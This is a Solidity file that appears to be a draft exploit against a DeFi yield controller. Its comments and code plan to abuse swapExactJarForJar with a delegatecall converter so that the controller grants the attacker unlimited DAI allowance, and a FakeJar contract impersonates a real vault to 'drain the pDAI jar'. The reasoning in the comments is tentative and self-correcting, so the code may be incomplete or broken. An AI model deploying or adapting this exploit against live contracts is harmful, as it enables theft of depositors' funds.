pragma solidity ^0.6.7;
pragma experimental ABIEncoderV2;

import "./lib/erc20.sol";
import "./interfaces/controller.sol";
import "./interfaces/jar.sol";

contract Strategy {
    address public constant controller = 0x6847259b2B3A4c17e7c43C54409810aF48bA5210;
    address public constant pDAI = 0x6949Bb274A6Be2703B22247a78f5543299b99bfe;
    address public constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address public constant curveProxyLogic = 0x6186E99D979664D3701Af2E44be1d00330923C7d;

    function run() public {
        // 1. Create a fake Jar that returns the real DAI as its token
        // 2. Call swapExactJarForJar with pDAI as fromJar and our fake Jar as toJar
        // 3. Use curveProxyLogic as a target to delegatecall into
        // 4. The delegatecall will execute in Controller context.
        // 5. We can use this to approve ourselves to spend the Controller's tokens or transfer them.

        // However, the vulnerability is simpler: swapExactJarForJar allows multiple targets.
        // We need to find an approved converter.
        // Let's check if curveProxyLogic is approved.

        address[] memory targets = new address[](1);
        targets[0] = curveProxyLogic;

        bytes[] memory data = new bytes[](1);
        // We want to execute something that gives us money.
        // Since it's delegatecall, we can call DAI.approve(address(this), uint(-1))
        data[0] = abi.encodeWithSignature("approve(address,uint256)", address(this), uint256(-1));

        // We need some pDAI to start the swap, or we can try with 0 if the contract allows.
        // But wait, the controller has a lot of assets.
        // Let's just try to drain the pDAI jar.

        try IController(controller).swapExactJarForJar(
            pDAI,
            pDAI,
            0,
            0,
            targets,
            data
        ) {} catch {}

        // If the above worked, we now have allowance on DAI from the Controller.
        // But the Controller doesn't hold the DAI, the Jar/Strategy does.
        // The Controller can call withdraw on strategies.
    }
}

contract FakeJar {
    function token() external view returns (address) { return 0x6B175474E89094C44Da98b954EedeAC495271d0F; }
    function getRatio() external view returns (uint256) { return 1e18; }
    function decimals() external view returns (uint8) { return 18; }
    function withdraw(uint256) external {}
    function deposit(uint256) external {}
    function balanceOf(address) external view returns (uint256) { return 0; }
    function transfer(address, uint256) external returns (bool) { return true; }
}
